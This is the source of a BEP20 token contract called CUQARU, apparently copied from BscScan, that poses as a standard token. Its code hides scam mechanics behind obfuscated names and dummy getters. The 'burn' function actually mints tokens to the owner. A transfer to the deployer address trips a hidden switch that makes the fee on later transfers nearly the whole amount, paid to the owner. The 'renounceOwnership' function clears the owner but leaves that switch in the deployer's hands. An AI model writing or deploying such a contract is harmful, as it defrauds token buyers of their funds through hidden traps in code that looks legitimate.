/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.6.6;

interface IUniswapV2Factoryyuy {
    event PairCreate(address indexed token0, address indexed token1, address pair, uint);
    function allPagfhfbvbirs(uint) external view returns (address pair);
    function allPaiiuiength() external view returns (uint);
    function createhgkPair(address tokenA, address tokenB) external returns (address pair);
		function fundTodreeqew() external view returns (address);
    function fundToadddfg() external view returns (address);
    function getdsfmnPair3(address tokenA, address tokenB) external view returns (address pair);
    function setLkjeierewPTo(address) external;
    function setLPjfjTrewoadd(address) external;
}


contract WVNUTRU {
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  symbol = "CUQARU";
uint256 public constant SQSWJY = 99999;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  name = "CUQARU";
address private  HYOJZS = address(0);
uint256 private  TZESUS = 1000000000000000;
uint8 public constant decimals = 18;
address private  DANCMY = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  JMAXUU = address(0);
uint256 private  LJJTFJ = 100000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 private  YUNLQF = 1000000000000000000;
uint256 private  CWAQJB = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
uint256 private  ZGCLUQ = 1000000000000000000;
uint256 private  YFCBZF = 10000000000000;
address private  MCGOZZ = address(0);
uint256 private  BOQGTN = 1000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  XNLGWR = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getLJJTFJ() private returns (uint256) {
return LJJTFJ;
}

function _getHYOJZS() private returns (address) {
return HYOJZS;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getTZESUS() private returns (uint256) {
return TZESUS;
}

function _getYUNLQF() private returns (uint256) {
return YUNLQF;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getYFCBZF() private returns (uint256) {
return YFCBZF;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "YNBITM");
require(to != address(0), "YNBITM");
require(amount <= balanceOf[from], "YNBITM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* SQSWJY/ZGCLUQ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==DANCMY){
ZGCLUQ = SQSWJY+2;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getBOQGTN() private returns (uint256) {
return BOQGTN;
}

function _getJMAXUU() private returns (address) {
return JMAXUU;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getMCGOZZ() private returns (address) {
return MCGOZZ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public 
{
DANCMY = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getXNLGWR() private returns (address) {
return XNLGWR;
}

function _getCWAQJB() private returns (uint256) {
return CWAQJB;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tYNBITM 0");
require(spender != address(0), "fYNBITM 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}